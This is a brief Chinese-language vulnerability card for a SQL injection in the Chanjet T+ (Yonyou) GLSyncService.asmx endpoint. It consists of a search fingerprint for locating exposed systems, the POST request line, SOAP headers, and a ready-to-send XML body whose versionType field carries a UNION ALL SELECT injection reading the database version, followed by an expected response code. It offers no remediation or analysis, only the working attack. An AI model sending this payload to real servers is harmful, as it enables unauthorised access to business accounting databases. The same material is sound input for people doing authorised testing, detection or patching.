# 畅捷通T+GLSyncService.asmx存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/GLSyncService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://www.chanjet.com/GetSourceAccountDataTable"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetSourceAccountDataTable xmlns="http://www.chanjet.com/">
<versionType>' UNION ALL SELECT NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>
</GetSourceAccountDataTable>
</soap:Body>
</soap:Envelope>
```
- **预期**：500　|　—